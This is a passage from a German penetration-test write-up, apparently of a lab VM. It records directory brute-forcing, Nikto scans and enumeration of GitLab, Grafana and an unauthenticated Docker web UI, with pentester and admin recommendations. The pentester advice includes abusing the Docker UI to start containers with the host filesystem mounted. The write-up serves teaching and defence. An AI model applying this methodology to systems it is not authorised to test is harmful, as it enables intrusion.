                <br>**Empfehlung (Admin):** Minimieren Sie die Ã¼ber das Web zugÃ¤nglichen Endpunkte und sichern Sie API-Zugriffe streng ab. Stellen Sie sicher, dass Benutzerprofile (auch fÃ¼r den Root-Benutzer) keine unnÃ¶tigen Informationen preisgeben.
            </p>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">â”Œâ”€â”€(rootã‰¿CCat)-[~]<br>â””â”€# <span class="command">feroxbuster --url "http://192.168.2.215:5080" --wordlist /usr/share/seclists/Discovery/Web-Content/directory-list-2.2-medium.txt -x .git,.php,.html,.xml,.zip,.7z,.tar,.bak,.sql,.py,.pl,.txt,.jpg,.jpeg,.png,.js,.aac,.ogg,.flac,.alac,.wav,.aiff,.dsd,.mp3,.mp4,.mkv,.phtml -s 200 301 302</span></div>
                </div>
                <div class="terminal">
                    <pre>
 <span class="command">___  ___  __   __     __      __         __   ___</span>
<span class="command">|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__</span>
<span class="command">|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___</span>
<span class="command">by Ben "epi" Risher ğŸ¤“                 ver: 2.11.0</span>
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 ğŸ¯  <span class="command">Target Url            â”‚ http://192.168.2.215:5080</span>
 ğŸš€  <span class="command">Threads               â”‚ 50</span>
 ğŸ“–  <span class="command">Wordlist              â”‚ /usr/share/seclists/Discovery/Web-Content/directory-list-2.2-medium.txt</span>
 ğŸ‘Œ  <span class="command">Status Codes          â”‚ [200, 301, 302]</span>
 ğŸ’¥  <span class="command">Timeout (secs)        â”‚ 7</span>
 ğŸ¦¡  <span class="command">User-Agent            â”‚ feroxbuster/2.11.0</span>
 ğŸ’‰  <span class="command">Config File           â”‚ /etc/feroxbuster/ferox-config.toml</span>
 ğŸ”  <span class="command">Extract Links         â”‚ true</span>
 ğŸ’²  <span class="command">Extensions            â”‚ [git, php, html, xml, zip, 7z, tar, bak, sql, py, pl, txt, jpg, jpeg, png, js, aac, ogg, flac, alac, wav, aiff, dsd, mp3, mp4, mkv, phtml]</span>
 ğŸ  <span class="command">HTTP methods          â”‚ [GET]</span>
 ğŸ”ƒ  <span class="command">Recursion Depth       â”‚ 4</span>
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 ğŸ  Press [ENTER] to use the Scan Management Menuâ„¢
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
....
...
<span class="command">200      GET       72l      207w     2095c http://192.168.2.215:5080/robots.txt</span>
<span class="command">200      GET        2l      318w    16392c http://192.168.2.215:5080/assets/webpack/pages.users.620d5164.chunk.js</span>
<span class="command">200      GET        2l     1184w    61099c http://192.168.2.215:5080/assets/webpack/commons~pages.groups.show~pages.projects.environments.metrics~pages.projects.graphs.show~pages.users.7ba1fbfd.chunk.js</span>
<span class="command">200      GET        1l        5w      245c http://192.168.2.215:5080/users/root/snippets.json</span>
<span class="command">200      GET        1l        4w       88c http://192.168.2.215:5080/users/root/groups.json</span>
<span class="command">200      GET        7l       18w      381c http://192.168.2.215:5080/root.atom</span>
<span class="command">200      GET      299l      936w    15535c http://192.168.2.215:5080/users/root/groups</span>
<span class="command">200      GET        1l        5w      169c http://192.168.2.215:5080/users/root/projects.json</span>
<span class="command">301      GET        1l        5w       96c http://192.168.2.215:5080/users/root/ --&gt; http://192.168.2.215:5080/root</span>
<span class="command">200      GET      300l      942w    15606c http://192.168.2.215:5080/users/root/snippets</span>
<span class="command">200      GET      299l      936w    15539c http://192.168.2.215:5080/users/root/activity</span>
<span class="command">200      GET        1l        1w        2c http://192.168.2.215:5080/users/root/calendar.json</span>
<span class="command">200      GET        6l       14w      118c http://192.168.2.215:5080/users/root/calendar_activities</span>
<span class="command">200      GET      299l      936w    15520c http://192.168.2.215:5080/root</span>
<span class="command">200      GET      299l      936w    15545c http://192.168.2.215:5080/users/root/contributed</span>
<span class="command">200      GET        1l        5w      159c http://192.168.2.215:5080/users/root/contributed.json</span>
<span class="command">200      GET      299l      936w    15539c http://192.168.2.215:5080/users/root/projects</span>
<span class="command">200      GET      244l      777w    13120c http://192.168.2.215:5080/explore.html</span>
<span class="command">200      GET       94l      192w     2936c http://192.168.2.215:5080/422.html</span>
<span class="command">200      GET       93l      186w     2930c http://192.168.2.215:5080/503.html</span>
....
</pre>
                </div>
            </div>

            <p class="analysis">
                **Analyse:** Ich setze Feroxbuster auch auf dem Grafana-Dienst auf Port 3000 ein, um dort Verzeichnisse und Dateien zu finden, die Ã¼ber die Standard-Login-Seite hinausgehen. Die Optionen sind Ã¤hnlich wie beim Scan auf Port 5080.
            </p>
            <p class="evaluation">
                **Bewertung:** Feroxbuster fand einige relevante Pfade auf Port 3000, darunter `/login` und `/signup` (was zur Identifizierung als Grafana passt) und verschiedene Pfade unter `/public/build/`, die auf JavaScript-Dateien fÃ¼r das Frontend hindeuten. Interessanter sind Pfade wie `/public` und `/reports` (die weiterleiten) sowie `/public/img`. Dies gibt mir einen Einblick in die Struktur des Grafana-Webservers.
            </p>
            <p class="recommendation">
                **Empfehlung (Pentester):** Untersuchen Sie die gefundenen Pfade manuell oder mit spezialisierten Grafana-Tools, falls verfÃ¼gbar. Achten Sie auf Ã¶ffentlich zugÃ¤ngliche Dateien oder APIs unter `/public/`.
                <br>**Empfehlung (Admin):** Stellen Sie sicher, dass alle Ã¶ffentlich zugÃ¤nglichen Verzeichnisse sicher konfiguriert sind und keine sensiblen Dateien enthalten.
            </p>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">â”Œâ”€â”€(rootã‰¿CCat)-[~]<br>â””â”€# <span class="command">feroxbuster --url "http://192.168.2.215:3000" --wordlist /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.2-medium.txt -x txt,php,rar....s.map,pHtml,yaml -b '503,404,403' -e --no-error -k</span></div>
                </div>
                <div class="terminal">
                    <pre>
 <span class="command">___  ___  __   __     __      __         __   ___</span>
<span class="command">|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__</span>
<span class="command">|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___</span>
<span class="command">by Ben "epi" Risher ğŸ¤“                 ver: 2.11.0</span>
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 ğŸ¯  <span class="command">Target Url            â”‚ http://192.168.2.215:3000</span>
 ğŸš€  <span class="command">Threads               â”‚ 50</span>
 ğŸ“–  <span class="command">Wordlist              â”‚ /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.2-medium.txt</span>
 ğŸ‘Œ  <span class="command">Status Codes          â”‚ [200, 301, 302]</span>
 ğŸ’¥  <span class="command">Timeout (secs)        â”‚ 7</span>
 ğŸ¦¡  <span class="command">User-Agent            â”‚ feroxbuster/2.11.0</span>
 ğŸ’‰  <span class="command">Config File           â”‚ /etc/feroxbuster/ferox-config.toml</span>
 ğŸ”  <span class="command">Extract Links         â”‚ true</span>
 ğŸ’²  <span class="command">Extensions            â”‚ [git, php, html, xml, zip, 7z, tar, bak, sql, py, pl, txt, jpg, jpeg, png, js, aac, ogg, flac, alac, wav, aiff, dsd, mp3, mp4, mkv, phtml]</span>
 ğŸ  <span class="command">HTTP methods          â”‚ [GET]</span>
 ğŸ”ƒ  <span class="command">Recursion Depth       â”‚ 4</span>
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 ğŸ  Press [ENTER] to use the Scan Management Menuâ„¢
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
...
<span class="command">200      GET        2l     1581w    80548c http://192.168.2.215:3000/public/build/6278.7bf7079e5ffd2b9b4bd3.js</span>
<span class="command">200      GET        3l     3799w   185627c http://192.168.2.215:3000/public/build/3144.7bf7079e5ffd2b9b4bd3.js</span>
<span class="command">200      GET        3l    55711w  3378979c http://192.168.2.215:3000/public/build/633.7bf7079e5ffd2b9b4bd3.js</span>
<span class="command">200      GET      192l      704w    27909c http://192.168.2.215:3000/login</span>
<span class="command">200      GET      192l      704w    27860c http://192.168.2.215:3000/signup</span>
<span class="command">302      GET        2l        2w       31c http://192.168.2.215:3000/public --&gt; http://192.168.2.215:3000/public/</span>
<span class="command">302      GET        2l        2w       24c http://192.168.2.215:3000/reports --&gt; http://192.168.2.215:3000/</span>
<span class="command">302      GET        2l        2w       35c http://192.168.2.215:3000/public/img --&gt; http://192.168.2.215:3000/public/img/</span>
...
</pre>
                </div>
            </div>

            <p class="analysis">
                **Analyse:** Ich fÃ¼hre auch einen Feroxbuster-Scan auf dem Dienst auf Port 9000 durch, der als "Golang net/http server" und "containers | docker web-ui" identifiziert wurde. Ich verwende die gleichen Optionen wie zuvor.
            </p>
            <p class="evaluation">
                **Bewertung:** Der Scan auf Port 9000 fand verschiedene Pfade, insbesondere unter `/assets/`, die auf statische Dateien (CSS, JS, Bilder) einer Web-OberflÃ¤che hindeuten. Interessant ist der Fund von `/version`, `/assets/js/min/clients/index.js`, `/assets/js/min/containers/statistics.js` und Pfaden mit Weiterleitungen (`301`) wie `/assets/css` -> `css/`. Dies bestÃ¤tigt das Vorhandensein einer Web-OberflÃ¤che und gibt Einblick in deren Dateistruktur. Die Endpunkte unter `/assets/js/min/...` deuten auf clientseitigen Code hin.
            </p>
            <p class="recommendation">
                **Empfehlung (Pentester):** Untersuchen Sie die gefundene Web-OberflÃ¤che auf Port 9000 manuell. PrÃ¼fen Sie den Source Code der clientseitigen Skripte (`.js`) auf Hinweise zur FunktionalitÃ¤t oder versteckte Endpunkte.
                <br>**Empfehlung (Admin):** ÃœberprÃ¼fen Sie, ob die Web-OberflÃ¤che auf Port 9000 eine Authentifizierung erfordert und ob sensible Informationen oder Funktionen ungeschÃ¼tzt zugÃ¤nglich sind.
            </p>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">â”Œâ”€â”€(rootã‰¿CCat)-[~]<br>â””â”€# <span class="command">feroxbuster --url "http://192.168.2.215:9000" --wordlist /usr/share/seclists/Discovery/Web-Content/directory-list-2.2-medium.txt -x .git,.php,.html,.xml,.zip,.7z,.tar,.bak,.sql,.py,.pl,.txt,.jpg,.jpeg,.png,.js,.aac,.ogg,.flac,.alac,.wav,.aiff,.dsd,.mp3,.mp4,.mkv,.phtml -s 200 301 302</span></div>
                </div>
                <div class="terminal">
                    <pre>
 <span class="command">___  ___  __   __     __      __         __   ___</span>
<span class="command">|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__</span>
<span class="command">|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___</span>
<span class="command">by Ben "epi" Risher ğŸ¤“                 ver: 2.11.0</span>
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 ğŸ¯  <span class="command">Target Url            â”‚ http://192.168.2.215:9000</span>
 ğŸš€  <span class="command">Threads               â”‚ 50</span>
 ğŸ“–  <span class="command">Wordlist              â”‚ /usr/share/seclists/Discovery/Web-Content/directory-list-2.2-medium.txt</span>
 ğŸ‘Œ  <span class="command">Status Codes          â”‚ [200, 301, 302]</span>
 ğŸ’¥  <span class="command">Timeout (secs)        â”‚ 7</span>
 ğŸ¦¡  <span class="command">User-Agent            â”‚ feroxbuster/2.11.0</span>
 ğŸ’‰  <span class="command">Config File           â”‚ /etc/feroxbuster/ferox-config.toml</span>
 ğŸ”  <span class="command">Extract Links         â”‚ true</span>
 ğŸ’²  <span class="command">Extensions            â”‚ [git, php, html, xml, zip, 7z, tar, bak, sql, py, pl, txt, jpg, jpeg, png, js, aac, ogg, flac, alac, wav, aiff, dsd, mp3, mp4, mkv, phtml]</span>
 ğŸ  <span class="command">HTTP methods          â”‚ [GET]</span>
 ğŸ”ƒ  <span class="command">Recursion Depth       â”‚ 4</span>
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 ğŸ  Press [ENTER] to use the Scan Management Menuâ„¢
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
....
<span class="command">301      GET        0l        0w        0c http://192.168.2.215:9000/assets/css/index.html --&gt; ./</span>
<span class="command">301      GET        0l        0w        0c http://192.168.2.215:9000/assets/index.html --&gt; ./</span>
<span class="command">301      GET        0l        0w        0c http://192.168.2.215:9000/assets/css/lib/index.html --&gt; ./</span>
<span class="command">301      GET        0l        0w        0c http://192.168.2.215:9000/assets/img/index.html --&gt; ./</span>
<span class="command">301      GET        0l        0w        0c http://192.168.2.215:9000/assets/css/app/index.html --&gt; ./</span>
<span class="command">200      GET        5l        8w      113c http://192.168.2.215:9000/assets/js/min/</span>
<span class="command">301      GET        0l        0w        0c http://192.168.2.215:9000/assets/js/min/index.html --&gt; ./</span>
<span class="command">301      GET        0l        0w        0c http://192.168.2.215:9000/assets/js/index.html --&gt; ./</span>
<span class="command">200      GET        0l        0w        0c http://192.168.2.215:9000/version</span>
<span class="command">301      GET        2l        3w       43c http://192.168.2.215:9000/assets --&gt; http://192.168.2.215:9000/assets/</span>
<span class="command">301      GET        0l        0w        0c http://192.168.2.215:9000/assets/css --&gt; css/</span>
<span class="command">200      GET        1l       63w     4658c http://192.168.2.215:9000/assets/js/min/clients/index.js</span>
<span class="command">301      GET        0l        0w        0c http://192.168.2.215:9000/assets/js/min/clients --&gt; clients/</span>
<span class="command">301      GET        0l        0w        0c http://192.168.2.215:9000/assets/js/lib --&gt; lib/</span>
<span class="command">301      GET        0l        0w        0c http://192.168.2.215:9000/assets/css/lib --&gt; lib/</span>
<span class="command">200      GET        1l      125w     9939c http://192.168.2.215:9000/assets/js/min/containers/statistics.js</span>
<span class="command">301      GET        0l        0w        0c http://192.168.2.215:9000/assets/css/app --&gt; app/</span>
...
</pre>
                </div>
            </div>

            <p class="analysis">
                **Analyse:** Ich navigiere im Browser zur Web-OberflÃ¤che auf Port 9000. Das Bild zeigt die Hauptansicht, die eine Liste von Docker-Containern darstellt. Die Ãœberschrift "containers | docker web-ui" bestÃ¤tigt meine Vermutung. Die Liste zeigt 4 laufende Container mit ihren Namen, IDs, Kommandos, Port-Mappings und verwendeten Images: `boring_tharp` (Python Debug Server, Port 8080, Image `whalesalad/docker-debug`), `gitlab-docker_web_1` (GitLab, Ports 5022, 50443, 5080, Image `gitlab/gitlab-ce:11.4.7-ce.0`), `grafana` (Grafana, Port 3000, Image `grafana/grafana-enterprise:8.3.0-ubuntu`), und `peaceful_jennings` (Docker WebUI selbst, Port 9000, Image `pottava/docker-webui`). Dies ist eine sehr detaillierte Ãœbersicht der Container-Architektur des Zielsystems.
            </p>
            <p class="evaluation">
                **Bewertung:** Dieser Fund ist extrem wertvoll! Er erklÃ¤rt die Vielzahl der offenen Ports â€“ jeder Dienst lÃ¤uft in einem separaten Docker-Container. Ich kenne nun die genauen Images und Versionen der Container, was fÃ¼r die Suche nach Container-spezifischen Schwachstellen oder Escape-Vektoren nÃ¼tzlich ist. Ich sehe die interne Struktur und die Beziehungen zwischen den Diensten. Die GitLab-Version (11.4.7) und die Grafana-Version (8.3.0-ubuntu) werden hier bestÃ¤tigt.
            </p>
            <p class="recommendation">
                **Empfehlung (Pentester):** Analysieren Sie die gelisteten Container und ihre Images auf bekannte Schwachstellen. Untersuchen Sie die Docker Web-UI auf Port 9000 auf ungesicherte Funktionen, die die Interaktion mit Docker ermÃ¶glichen (z.B. AusfÃ¼hren von Befehlen in Containern, Starten neuer Container).
                <br>**Empfehlung (Admin):** Stellen Sie sicher, dass Management-OberflÃ¤chen wie die Docker Web-UI (falls Ã¼berhaupt notwendig) nicht Ã¶ffentlich zugÃ¤nglich sind und eine starke Authentifizierung erfordern. ÃœberprÃ¼fen Sie die Images auf veraltete Software.
            </p>
            <p>
                Analyse der Docker Web-UI auf Port 9000:
            </p>
            <pre>
<span class="command">http://192.168.2.215:9000/</span>
<span class="command">docker web-ui</span>

    <span class="command">containers</span>
    <span class="command">logs</span>
    <span class="command">stats</span>
    |
    <span class="command">images</span>
    |
    <span class="command">clients</span>

<span class="command">4 containers</span>
<span class="command">ID	Names	Command	Ports	Repository &amp; Tags	Status</span>
<span class="command">3573	</span>

    <span class="command">boring_tharp</span>

	<span class="command">python /app/a..	0.0.0.0:8080-&gt;8080/tcp	whalesalad/docker-debug	Up an hour</span>
<span class="command">12e8	</span>

    <span class="command">gitlab-docker_web_1</span>

	<span class="command">/assets/wrapp..	0.0.0.0:5022-&gt;22/tcp,0.0.0.0:50443-&gt;443/tcp,0.0.0.0:5080-&gt;80/tcp	gitlab/gitlab-ce:11.4.7-ce.0	Up an hour (healthy)</span>
<span class="command">c2f5	</span>

    <span class="command">grafana</span>

	<span class="command">/run.sh	0.0.0.0:3000-&gt;3000/tcp	grafana/grafana-enterprise:8.3.0-ubuntu	Up an hour</span>
<span class="command">4001	</span>

    <span class="command">peaceful_jennings</span>

	<span class="command">docker-webui ..	0.0.0.0:9000-&gt;9000/tcp	pottava/docker-webui	Up an hour</span>
</pre>

            <p class="analysis">
                **Analyse:** Ich habe die Details eines spezifischen Docker-Images abgerufen, wahrscheinlich Ã¼ber die Docker Web-UI auf Port 9000 oder durch manuelle Analyse. Das Listing zeigt Metadaten zum Image `ubuntu:18.04`, einschlieÃŸlich seiner ID, Erstellungsdatum, Konfiguration (Hostname, PATH, CMD) und RootFS-Layer.
            </p>
            <p class="evaluation">
                **Bewertung:** Die MÃ¶glichkeit, Image-Details abzurufen, bestÃ¤tigt eine gewisse Interaktion mit der Docker-Engine Ã¼ber die Web-UI (oder eine andere Methode). Das Wissen um das `ubuntu:18.04` Image ist nÃ¼tzlich, da es als Basis fÃ¼r Container-AusbrÃ¼che oder zur AusfÃ¼hrung von Befehlen in neuen Containern verwendet werden kann, falls die Docker-API oder die UI-FunktionalitÃ¤t dies zulÃ¤sst. Die Image-ID `sha256:71cb16d32be4a95065b4fa1c8841a6f4c0098de7be0a90e14519098412d48356` ist die eindeutige Referenz.
            </p>
            <p class="recommendation">
                **Empfehlung (Pentester):** Nutzen Sie die gefundene Image-ID, um das Image ggf. selbst herunterzuladen und offline zu analysieren. Testen Sie, ob Sie neue Container basierend auf diesem oder anderen Images starten kÃ¶nnen, eventuell mit gemountetem Host-Dateisystem.
                <br>**Empfehlung (Admin):** BeschrÃ¤nken Sie den Zugriff auf die Docker-API und Management-OberflÃ¤chen streng. ÃœberprÃ¼fen Sie die Images auf sensible Konfigurationen oder Dateien, die beim Bauen unbeabsichtigt hinzugefÃ¼gt wurden.
            </p>
             <pre>
<span class="command">ubuntu:18.04</span>
{
 <span class="command">"Id": "sha256:71cb16d32be4a95065b4fa1c8841a6f4c0098de7be0a90e14519098412d48356"</span>,
 <span class="command">"RepoTags": [</span>
  <span class="command">"ubuntu:18.04"</span>
 ],
 <span class="command">"Created": "2022-10-04T23:35:04.927324933Z"</span>,
 <span class="command">"Container": "35c51f413ad633f9fac7490dfcbd26f5487c87206fd611be09c868d04cebc1b9"</span>,
 <span class="command">"ContainerConfig": {</span>
  <span class="command">"Hostname": "35c51f413ad6"</span>,
  <span class="command">"Env": [</span>
   <span class="command">"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"</span>
  ],
  <span class="command">"Cmd": [</span>
   <span class="command">"/bin/sh"</span>,
   <span class="command">"-c"</span>,
   <span class="command">"#(nop) "</span>,
   <span class="command">"CMD [\"bash\"]"</span>
  ],
  <span class="command">"Image": "sha256:768c80f47ccbda97534fb527ed3082a6b1a6330b5213d0de6c2059ad8322a98b"</span>,
  <span class="command">"Entrypoint": null</span>
 },
 <span class="command">"DockerVersion": "20.10.12"</span>,
 <span class="command">"Config": {</span>
  <span class="command">"Env": [</span>
   <span class="command">"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"</span>
  ],
  <span class="command">"Cmd": [</span>
   <span class="command">"bash"</span>
  ],
  <span class="command">"Image": "sha256:768c80f47ccbda97534fb527ed3082a6b1a6330b5213d0de6c2059ad8322a98b"</span>,
  <span class="command">"Entrypoint": null</span>
 },
 <span class="command">"Architecture": "amd64"</span>,
 <span class="command">"Size": 63146043</span>,
 <span class="command">"VirtualSize": 63146043</span>,
 <span class="command">"RepoDigests": [</span>
  <span class="command">"ubuntu@sha256:40b84b75884ff39e4cac4bf62cb9678227b1fbf9dbe3f67ef2a6b073aa4bb529"</span>
 ],
 <span class="command">"RootFS": {</span>
  <span class="command">"Type": "layers"</span>,
  <span class="command">"Layers": [</span>
   <span class="command">"sha256:b9b23e6545749dab77233e9c3ce2237e6705cbd30de01e11f529b0e49c155cd5"</span>
  ]
 },
 <span class="command">"Os": "linux"</span>
}
</pre>

            <p class="analysis">
                **Analyse:** Ich habe Wappalyzer, eine Browser-Erweiterung zur Identifizierung von Technologien auf Webseiten, auf den Webdiensten ausgefÃ¼hrt und dokumentiere die Ergebnisse. Dies gibt mir einen Ãœberblick Ã¼ber die verwendeten Frameworks, Bibliotheken und Sprachen.
            </p>
            <p class="evaluation">
                **Bewertung:** Wappalyzer bestÃ¤tigte das Vorhandensein von Grafana und GitLab sowie Technologien wie React, Vue.js, Ruby on Rails (wahrscheinlich fÃ¼r GitLab), Webpack, jQuery, Bootstrap. Dies ist eine nÃ¼tzliche ErgÃ¤nzung zu den Nmap- und Feroxbuster-Ergebnissen und bestÃ¤tigt die KomplexitÃ¤t der Web-Umgebung. Das Wissen um die spezifischen Versionen von Bibliotheken (z.B. jQuery 1.12.4, Bootstrap 4.1.1) kann fÃ¼r die Suche nach clientseitigen Schwachstellen relevant sein.
            </p>
            <p class="recommendation">
                **Empfehlung (Pentester):** Verwenden Sie Tools wie Wappalyzer, um schnell die eingesetzten Technologien zu identifizieren. Dies hilft bei der Fokussierung der Recherche auf bekannte Schwachstellen in diesen spezifischen Versionen.
                <br>**Empfehlung (Admin):** FÃ¼hren Sie regelmÃ¤ÃŸige Audits der eingesetzten Web-Technologien durch und halten Sie Frameworks und Bibliotheken aktuell, um bekannte Schwachstellen zu vermeiden. Minimieren Sie die Information Ã¼ber verwendete Versionen in Headern oder Metadaten.
            </p>
            <pre>
<span class="command">Wappalyzer:</span>
<span class="command">----------------------------------</span>

<span class="command">JavaScript Frameworks</span>
<span class="command">React 15.6.1</span>
<span class="command">Vue.js</span>

<span class="command">Ticketsysteme</span>
<span class="command">GitLab</span>

<span class="command">Web Frameworks</span>
<span class="command">Ruby on Rails 50% sure</span>

<span class="command">Sonstiges</span>
<span class="command">Webpack</span>
<span class="command">Open Graph</span>

<span class="command">Programmiersprache</span>
<span class="command">Ruby 50% sure</span>

<span class="command">Entwicklungswerkzeuge</span>
<span class="command">GitLab</span>

<span class="command">JavaScript Bibliotheken</span>
<span class="command">core-js 2.5.7</span>
<span class="command">jQuery 1.12.4</span>
<span class="command">Select2</span>

<span class="command">UI Frameworks</span>
<span class="command">Bootstrap 4.1.1</span>
</pre>

        </section>
```

**Teil 2 von 3**

```html
        <section id="web-enumeration">
            <h2>Web Enumeration</h2>
            <p class="analysis">
                **Analyse:** Ich fÃ¼hre Nikto-Scans auf den neu entdeckten HTTP-Diensten durch, beginnend mit Grafana auf Port 3000.
            </p>
            <p class="evaluation">
                **Bewertung:** Der Nikto-Scan auf Port 3000 bestÃ¤tigt, dass es sich um Grafana handelt. Er meldet eine Weiterleitung von `/` auf `/login` und findet den `/robots.txt` Eintrag, der `Disallow: /` enthÃ¤lt. Es werden keine kritischen Webserver-Schwachstellen berichtet, abgesehen vom fehlenden `X-Content-Type-Options` Header. Die relevante Information ist die BestÃ¤tigung, dass `/login/` existiert, was zum Anmelden einlÃ¤dt.
            </p>
            <p class="recommendation">
                **Empfehlung (Pentester):** Der Fokus liegt weiterhin auf der Login-FunktionalitÃ¤t. Suchen Sie nach Standard-Anmeldedaten oder Schwachstellen, die eine Umgehung der Authentifizierung ermÃ¶glichen.
                <br>**Empfehlung (Admin):** Implementieren Sie Sicherheits-Header. ÃœberprÃ¼fen Sie die Grafana-Konfiguration auf ungesicherte Endpunkte oder Standard-Anmeldedaten.
            </p>
             <div class="code-block">
                <div class="terminal">
                    <div class="prompt">â”Œâ”€â”€(rootã‰¿CCat)-[~]<br>â””â”€# <span class="command">nikto -h http://192.168.2.215:3000</span></div>
                </div>
                <div class="terminal">
                    <pre>
<span class="password">- Nikto v2.5.0</span>
<span class="password">---------------------------------------------------------------------------</span>
<span class="command">+ Target IP:          192.168.2.215</span>
<span class="command">+ Target Hostname:    192.168.2.215</span>
<span class="command">+ Target Port:        3000</span>
<span class="password">+ Start Time:         2025-06-06 23:13:25 (GMT2)</span>
<span class="password">---------------------------------------------------------------------------</span>
<span class="command">+ Server: No banner retrieved</span>
<span class="command">+ Root page / redirects to: /login</span>
+ No CGI Directories found (use '-C all' to force check all possible dirs)
<span class="password">+ /robots.txt: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: [Link: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/ | Ziel: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/]</span>
<span class="password">+ /login/: This might be interesting.</span>
<span class="password">+ 8103 requests: 0 error(s) and 2 item(s) reported on remote host</span>
<span class="password">+ End Time:           2025-06-06 23:14:04 (GMT2) (39 seconds)</span>
<span class="password">---------------------------------------------------------------------------</span>
<span class="password">+ 1 host(s) tested</span>
</pre>
                </div>
            </div>

            <p class="analysis">
                **Analyse:** Ich fÃ¼hre einen Nikto-Scan auf dem Docker Web UI auf Port 9000 durch.
            </p>
            <p class="evaluation">
                **Bewertung:** Der Scan auf Port 9000 meldet fehlende Sicherheits-Header (`X-Frame-Options`, `X-Content-Type-Options`) und dass der Server mit ungÃ¼ltigen HTTP-Methoden gÃ¼ltig antwortet, was auf eine ungewÃ¶hnliche Implementierung hindeutet. Es werden keine spezifischen kritischen Schwachstellen gemeldet, die direkt ausnutzbar wÃ¤ren. Der Dienst hat keine Login-Seite im klassischen Sinne, wie aus der Nmap-Ausgabe hervorging ("containers | docker web-ui" im Titel), was bedeutet, er kÃ¶nnte ungeschÃ¼tzt sein.
            </p>
            <p class="recommendation">
                **Empfehlung (Pentester):** Untersuchen Sie die FunktionalitÃ¤t der Docker Web UI auf Port 9000 auf unauthentifizierten Zugriff und die MÃ¶glichkeit, mit Containern oder Images zu interagieren. Dies scheint eine potenzielle AngriffsflÃ¤che zu sein, da kein Login erforderlich zu sein scheint.
                <br>**Empfehlung (Admin):** Sichern Sie den Zugriff auf Management-Schnittstellen wie diese Docker Web UI. StandardmÃ¤ÃŸig sollten sie nicht Ã¶ffentlich zugÃ¤nglich sein.
            </p>
             <div class="code-block">
                <div class="terminal">
                    <div class="prompt">â”Œâ”€â”€(rootã‰¿CCat)-[~]<br>â””â”€# <span class="command">nikto -h http://192.168.2.215:9000</span></div>
                </div>
                <div class="terminal">
                    <pre>
<span class="password">- Nikto v2.5.0</span>
<span class="password">---------------------------------------------------------------------------</span>
<span class="command">+ Target IP:          192.168.2.215</span>
<span class="command">+ Target Hostname:    192.168.2.215</span>
<span class="command">+ Target Port:        9000</span>
<span class="password">+ Start Time:         2025-06-06 23:14:28 (GMT2)</span>
<span class="password">---------------------------------------------------------------------------</span>
<span class="command">+ Server: No banner retrieved</span>
<span class="password">+ /: The anti-clickjacking X-Frame-Options header is not present. See: [Link: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options | Ziel: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options]</span>
